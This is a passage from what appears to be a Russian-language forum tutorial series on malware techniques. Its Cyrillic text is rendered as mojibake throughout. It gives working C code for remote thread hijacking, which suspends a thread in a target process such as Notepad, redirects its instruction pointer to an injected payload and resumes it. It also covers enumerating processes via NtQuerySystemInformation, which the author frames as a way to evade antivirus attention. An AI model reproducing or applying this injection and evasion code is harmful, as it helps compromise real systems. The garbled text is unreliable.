dwProcessId - —ç—Ç–æ PID —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞. –ö–∞–∫ –µ–≥–æ –ø–æ–ª—É—á–∏—Ç—å, —á–∏—Ç–∞–π—Ç–µ –≤ —Ç–µ–º–µ –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ PID –Ω—É–∂–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, –∏–ª–∏ –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ | –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot;  —ç—Ç–æ–≥–æ —Ü–∏–∫–ª–∞ —Å—Ç–∞—Ç–µ–π.<br />
dwThreadId - —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ DWORD, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–ª—É—á–∏—Ç –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –ø–æ—Ç–æ–∫–∞ —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
hThread - —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ HANDLE, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–ª—É—á–∏—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞.<br />
<br />
–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–µ –æ—Ç–ª–∏—á–∏–µ –≤ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ —Ñ—É–Ω–∫—Ü–∏–∏ GetRemoteThreadhandle –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Ç–æ–º, —á—Ç–æ –Ω—É–∂–Ω–æ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏—Ç—å —Ü–µ–ª–µ–≤–æ–π PID.<br />
–í —Å–ª—É—á–∞–µ —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, –∫–æ—Ç–æ—Ä—ã–π —Ä–∞–±–æ—Ç–∞–µ—Ç –ª–æ–∫–∞–ª—å–Ω–æ, —ç—Ç–æ –Ω–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è, –ø–æ—Ç–æ–º—É —á—Ç–æ GetCurrentProcessId WinAPI –∏–∑–≤–ª–µ–∫–∞–µ—Ç PID –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetRemoteThreadhandle(IN DWORD dwProcessId, OUT DWORD* dwThreadId, OUT HANDLE* hThread) {

    HANDLE         hSnapShot  = NULL;
    THREADENTRY32  Thr        = {
        .dwSize = sizeof(THREADENTRY32)
    };

    // –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–Ω–∏–º–∫–∞ –ø–æ—Ç–æ–∫–æ–≤ —Ç–µ–∫—É—â–µ–≥–æ –≤—ã–ø–æ–ª–Ω—è–µ–º–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        printf(&quot;\n\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n&quot;, GetLastError());
        goto _EndOfFunction;
    }

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–µ—Ä–≤–æ–º –ø–æ—Ç–æ–∫–µ, –Ω–∞–π–¥–µ–Ω–Ω–æ–º –≤ —Å–Ω–∏–º–∫–µ.
    if (!Thread32First(hSnapShot, &amp;Thr)) {
        printf(&quot;\n\t[!] Thread32First Failed With Error : %d \n&quot;, GetLastError());
        goto _EndOfFunction;
    }

    do {
        // –ï—Å–ª–∏ PID –ø–æ—Ç–æ–∫–∞ —Ä–∞–≤–µ–Ω PID —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, —Ç–æ
        // —ç—Ç–æ—Ç –ø–æ—Ç–æ–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç –≤–Ω—É—Ç—Ä–∏ —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞
        if (Thr.th32OwnerProcessID == dwProcessId){

            *dwThreadId  = Thr.th32ThreadID;
            *hThread     = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID);

            if (*hThread == NULL)
                printf(&quot;\n\t[!] OpenThread Failed With Error : %d \n&quot;, GetLastError());

            break;
        }

    // –ü–æ–∫–∞ –≤ —Å–Ω–∏–º–∫–µ –æ—Å—Ç–∞—é—Ç—Å—è –ø–æ—Ç–æ–∫–∏
    } while (Thread32Next(hSnapShot, &amp;Thr));


_EndOfFunction:
    if (hSnapShot != NULL)
        CloseHandle(hSnapShot);
    if (*dwThreadId == NULL || *hThread == NULL)
        return FALSE;
    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–§—É–Ω–∫—Ü–∏—è –ü–µ—Ä–µ—Ö–≤–∞—Ç–∞ —É–¥–∞–ª–µ–Ω–Ω—ã—Ö –ø–æ—Ç–æ–∫–æ–≤</b><br />
<br />
–≠—Ç–∞ —á–∞—Å—Ç—å –∞–Ω–∞–ª–æ–≥–∏—á–Ω–∞ —Ñ—É–Ω–∫—Ü–∏–∏ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞, —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω–Ω–æ–π –≤ –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö –º–æ–¥—É–ª—è—Ö. –ü–æ–ª—É—á–∏—Ç–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, –≤–Ω–µ–¥—Ä–∏—Ç–µ –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –≤ —É–¥–∞–ª–µ–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å, –∞ –∑–∞—Ç–µ–º –≤—ã–ø–æ–ª–Ω–∏—Ç–µ –∑–∞—Ö–≤–∞—Ç –ø–æ—Ç–æ–∫–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {

    CONTEXT ThreadCtx = {
        .ContextFlags = CONTEXT_ALL
    };

    // –ü—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –ø–æ—Ç–æ–∫
    SuspendThread(hThread);

    if (!GetThreadContext(hThread, &amp;ThreadCtx)) {
        printf(&quot;\t[!] GetThreadContext Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    ThreadCtx.Rip = pAddress;

    if (!SetThreadContext(hThread, &amp;ThreadCtx)) {
        printf(&quot;\t[!] SetThreadContext Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    printf(&quot;\t[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt; –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è ... &quot;);
    getchar();

    ResumeThread(hThread);

    WaitForSingleObject(hThread, INFINITE);

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è</b><br />
<br />
–ü–æ–ª—É—á–µ–Ω–∏–µ PID —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞. –í –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ —Ü–µ–ª–µ–≤—ã–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º —è–≤–ª—è–µ—Ç—Å—è Notepad.exe.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781176194.png"
		data-src="https://osint42.org/attachments/1746781176194-png.129/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781176194-png.129/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781176194.png"
			title="1746781176194.png"
			width="1418" height="803" loading="lazy" />
	</div><br />
<br />
–í–Ω–µ–¥—Ä–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –∏ –∑–∞—Ö–≤–∞—Ç–∏—Ç –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –ø–æ—Ç–æ–∫–∞ 7136. –°—Ç–µ–∫ –ø–æ—Ç–æ–∫–∞ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç, —á—Ç–æ –∞–¥—Ä–µ—Å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ ‚Äî —ç—Ç–æ —Å–ª–µ–¥—É—é—â–∞—è –∑–∞–¥–∞—á–∞ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781182416.png"
		data-src="https://osint42.org/attachments/1746781182416-png.130/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781182416-png.130/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781182416.png"
			title="1746781182416.png"
			width="1718" height="717" loading="lazy" />
	</div><br />
<br />
–í –∏—Ç–æ–≥–µ, –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781190598.png"
		data-src="https://osint42.org/attachments/1746781190598-png.131/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781190598-png.131/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781190598.png"
			title="1746781190598.png"
			width="1113" height="728" loading="lazy" />
	</div></div>
						

							<h2>–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ PID –Ω—É–∂–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, –∏–ª–∏ –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤</h2>

							

							

							<div class="bbWrapper">–¢–µ–º–∞ –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –∑–∞—Ç—Ä–∞–≥–∏–≤–∞–ª–∞—Å—å –∑–¥–µ—Å—å:–ò–Ω—å–µ–∫—Ü–∏—è –≤ –ø—Ä–æ—Ü–µ—Å—Å | –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot;<br />
<br />
–¢–∞–∫–∂–µ –ò–∑—É—á–∞–µ–º —Ç–µ—Ö–Ω–∏–∫—É Thread Hijacking | –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º –¥–ª—è –ø—Ä–æ–≤–µ–¥–µ–Ω–∏—è –∞—Ç–∞–∫–∏ Thread Hijacking –≤ —É–¥–∞–ª–µ–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–ª—É—á–∏—Ç—å ID —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />
–î–∞–≤–∞–π—Ç–µ –ø–æ–ø—Ä–æ–±—É–µ–º —ç—Ç–æ —Å–¥–µ–ª–∞—Ç—å, —á—Ç–æ-–±—ã –Ω–µ –ø—Ä–∏–≤–ª–µ–∫–∞—Ç—å –≤–Ω–∏–º–∞–Ω–∏–µ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–æ–≤.)<br />
<br />
–ü—Ä–µ–¥–ª–∞–≥–∞—é –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏—é NtQuerySystemInformation.<br />
NtQuerySystemInformation —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ—Ç—Å—è –∏–∑ –º–æ–¥—É–ª—è ntdll.dll, –ø–æ—ç—Ç–æ–º—É –¥–ª—è –µ–≥–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –ø–æ—Ç—Ä–µ–±—É–µ—Ç—Å—è GetModuleHandle –∏ GetProcAddress.<br />
<br />
–î–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è Microsoft –ø–æ NtQuerySystemInformation –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç, —á—Ç–æ –æ–Ω —Å–ø–æ—Å–æ–±–µ–Ω –≤–æ–∑–≤—Ä–∞—â–∞—Ç—å –º–Ω–æ–≥–æ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–∏—Å—Ç–µ–º–µ. –û—Å–Ω–æ–≤–Ω–æ–µ –≤–Ω–∏–º–∞–Ω–∏–µ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–∏ –±—É–¥–µ—Ç —É–¥–µ–ª–µ–Ω–æ –µ–≥–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é –¥–ª—è –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤.<br />
<br />
<b>–ü–æ–ª—É—á–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ NtQuerySystemInformation </b><br />
<br />
–ö–∞–∫ –±—ã–ª–æ —É–ø–æ–º—è–Ω—É—Ç–æ —Ä–∞–Ω–µ–µ, –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∞–¥—Ä–µ—Å–∞ NtQuerySystemInformation –∏–∑ ntdll.dll –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã GetProcAddress –∏ GetModuleHandle.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Ñ—É–Ω–∫—Ü–∏—é
typedef NTSTATUS (NTAPI* fnNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
);

fnNtQuerySystemInformation pNtQuerySystemInformation = NULL;

// –ü–æ–ª—É—á–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ NtQuerySystemInformation
pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L&quot;NTDLL.DLL&quot;), &quot;NtQuerySystemInformation&quot;);
if (pNtQuerySystemInformation == NULL) {
    printf(&quot;[!] GetProcAddress –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: %d\n&quot;, GetLastError());
    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>–ü–∞—Ä–∞–º–µ—Ç—Ä—ã NtQuerySystemInformation</b><br />
<br />
–ü–∞—Ä–∞–º–µ—Ç—Ä—ã NtQuerySystemInformation –ø–æ–∫–∞–∑–∞–Ω—ã –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>__kernel_entry NTSTATUS NtQuerySystemInformation(
  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,
  [in, out]       PVOID                    SystemInformation,
  [in]            ULONG                    SystemInformationLength,
  [out, optional] PULONG                   ReturnLength
);</code></pre>
	</div>
</div><br />
SystemInformationClass - –û–ø—Ä–µ–¥–µ–ª—è–µ—Ç, –∫–∞–∫–æ–π —Ç–∏–ø —Å–∏—Å—Ç–µ–º–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Ñ—É–Ω–∫—Ü–∏—è.<br />
<br />
SystemInformation - –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –±—É—Ñ–µ—Ä, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–ª—É—á–∏—Ç –∑–∞–ø—Ä–æ—à–µ–Ω–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é. –í–æ–∑–≤—Ä–∞—â–µ–Ω–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –±—É–¥–µ—Ç –≤ —Ñ–æ—Ä–º–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã, —Ç–∏–ø –∫–æ—Ç–æ—Ä–æ–π —É–∫–∞–∑–∞–Ω –≤ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–∏–∏ —Å –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º SystemInformationClass.<br />
<br />
SystemInformationLength - –†–∞–∑–º–µ—Ä –±—É—Ñ–µ—Ä–∞, –Ω–∞ –∫–æ—Ç–æ—Ä—ã–π —É–∫–∞–∑—ã–≤–∞–µ—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä SystemInformation, –≤ –±–∞–π—Ç–∞—Ö.<br />
<br />
ReturnLength - –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é ULONG, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–ª—É—á–∏—Ç —Ñ–∞–∫—Ç–∏—á–µ—Å–∫–∏–π —Ä–∞–∑–º–µ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏, –∑–∞–ø–∏—Å–∞–Ω–Ω–æ–π –≤ SystemInformation.<br />
<br />
–ü–æ—Å–∫–æ–ª—å–∫—É –∑–∞–¥–∞—á–∞ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤, –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω —Ñ–ª–∞–≥ SystemProcessInformation. –ü—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ —ç—Ç–æ–≥–æ —Ñ–ª–∞–≥–∞ —Ñ—É–Ω–∫—Ü–∏—è –≤–µ—Ä–Ω–µ—Ç –º–∞—Å—Å–∏–≤ —Å—Ç—Ä—É–∫—Ç—É—Ä SYSTEM_PROCESS_INFORMATION (—á–µ—Ä–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä SystemInformation), –ø–æ –æ–¥–Ω–æ–π –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, —Ä–∞–±–æ—Ç–∞—é—â–µ–≥–æ –≤ —Å–∏—Å—Ç–µ–º–µ.<br />
<br />
<b>–°—Ç—Ä—É–∫—Ç—É—Ä–∞ SYSTEM_PROCESS_INFORMATION </b><br />
<br />
–°–ª–µ–¥—É—é—â–∏–º —à–∞–≥–æ–º –±—É–¥–µ—Ç –∏–∑—É—á–µ–Ω–∏–µ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏ Microsoft, —á—Ç–æ–±—ã –ø–æ–Ω—è—Ç—å, –∫–∞–∫ –≤—ã–≥–ª—è–¥–∏—Ç —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ SYSTEM_PROCESS_INFORMATION.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    BYTE Reserved1[48];
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    PVOID Reserved2;
    ULONG HandleCount;
    ULONG SessionId;
    PVOID Reserved3;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG Reserved4;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    PVOID Reserved5;
    SIZE_T QuotaPagedPoolUsage;
    PVOID Reserved6;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER Reserved7[6];
} SYSTEM_PROCESS_INFORMATION;</code></pre>
	</div>
</div><br />
–û—Å–Ω–æ–≤–Ω–æ–µ –≤–Ω–∏–º–∞–Ω–∏–µ –±—É–¥–µ—Ç —É–¥–µ–ª–µ–Ω–æ –ø–æ–ª—è–º UNICODE_STRING ImageName, –∫–æ—Ç–æ—Ä–æ–µ —Å–æ–¥–µ—Ä–∂–∏—Ç –∏–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞, –∏ UniqueProcessId, <b>–∫–æ—Ç–æ—Ä–æ–µ —è–≤–ª—è–µ—Ç—Å—è –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–æ–º –ø—Ä–æ—Ü–µ—Å—Å–∞.</b><br />
–ö—Ä–æ–º–µ —Ç–æ–≥–æ, –ø–æ–ª–µ NextEntryOffset –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ –¥–ª—è –ø–µ—Ä–µ—Ö–æ–¥–∞ –∫ —Å–ª–µ–¥—É—é—â–µ–º—É —ç–ª–µ–º–µ–Ω—Ç—É –≤ –≤–æ–∑–≤—Ä–∞—â–∞–µ–º–æ–º –º–∞—Å—Å–∏–≤–µ.<br />
<br />
–ü–æ—Å–∫–æ–ª—å–∫—É –≤—ã–∑–æ–≤ NtQuerySystemInformation —Å —Ñ–ª–∞–≥–æ–º SystemProcessInformation –≤–µ—Ä–Ω–µ—Ç –º–∞—Å—Å–∏–≤ —Å—Ç—Ä—É–∫—Ç—É—Ä SYSTEM_PROCESS_INFORMATION –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–≥–æ —Ä–∞–∑–º–µ—Ä–∞, NtQuerySystemInformation –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –≤—ã–∑–≤–∞–Ω –¥–≤–∞–∂–¥—ã. –ü–µ—Ä–≤—ã–π –≤—ã–∑–æ–≤ –ø–æ–ª—É—á–∏—Ç —Ä–∞–∑–º–µ—Ä –º–∞—Å—Å–∏–≤–∞, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –¥–ª—è –≤—ã–¥–µ–ª–µ–Ω–∏—è –±—É—Ñ–µ—Ä–∞, –∞ –∑–∞—Ç–µ–º –≤—Ç–æ—Ä–æ–π –≤—ã–∑–æ–≤ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –≤—ã–¥–µ–ª–µ–Ω–Ω—ã–π –±—É—Ñ–µ—Ä.<br />
<br />
–û–∂–∏–¥–∞–µ—Ç—Å—è, —á—Ç–æ –ø–µ—Ä–≤—ã–π –≤—ã–∑–æ–≤ NtQuerySystemInformation –∑–∞–≤–µ—Ä—à–∏—Ç—Å—è —Å –æ—à–∏–±–∫–æ–π STATUS_INFO_LENGTH_MISMATCH (0xC0000004), —Ç–∞–∫ –∫–∞–∫ –≤ –Ω–µ–º –ø–µ—Ä–µ–¥–∞—é—Ç—Å—è –Ω–µ–¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã, –ø—Ä–æ—Å—Ç–æ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ä–∞–∑–º–µ—Ä–∞ –º–∞—Å—Å–∏–≤–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>ULONG                        uReturnLen1    = NULL,
                             uReturnLen2    = NULL;
PSYSTEM_PROCESS_INFORMATION  SystemProcInfo = NULL;
NTSTATUS                     STATUS         = NULL;

// –ü–µ—Ä–≤—ã–π –≤—ã–∑–æ–≤ NtQuerySystemInformation
// –û–Ω –∑–∞–≤–µ—Ä—à–∏—Ç—Å—è –æ—à–∏–±–∫–æ–π STATUS_INFO_LENGTH_MISMATCH
// –ù–æ –æ–Ω –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ç–æ–º, —Å–∫–æ–ª—å–∫–æ –ø–∞–º—è—Ç–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤—ã–¥–µ–ª–∏—Ç—å (uReturnLen1)
pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &amp;uReturnLen1);

// –í—ã–¥–µ–ª–µ–Ω–∏–µ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ–≥–æ –±—É—Ñ–µ—Ä–∞ –¥–ª—è –≤–æ–∑–≤—Ä–∞—â–∞–µ–º–æ–≥–æ –º–∞—Å—Å–∏–≤–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä `SYSTEM_PROCESS_INFORMATION`
SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
if (SystemProcInfo == NULL) {
    printf(&quot;[!] HeapAlloc –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: %d\n&quot;, GetLastError());
    return FALSE;
}

// –í—Ç–æ—Ä–æ–π –≤—ã–∑–æ–≤ NtQuerySystemInformation
// –í—ã–∑—ã–≤–∞–µ–º NtQuerySystemInformation —Å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–º–∏ –∞—Ä–≥—É–º–µ–Ω—Ç–∞–º–∏, —Ä–µ–∑—É–ª—å—Ç–∞—Ç –±—É–¥–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ &#039;SystemProcInfo&#039;
STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &amp;uReturnLen2);
if (STATUS != 0x0) {
    printf(&quot;[!] NtQuerySystemInformation –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: 0x%0.8X \n&quot;, STATUS);
    return FALSE;
}</code></pre>
	</div>
</div><br />
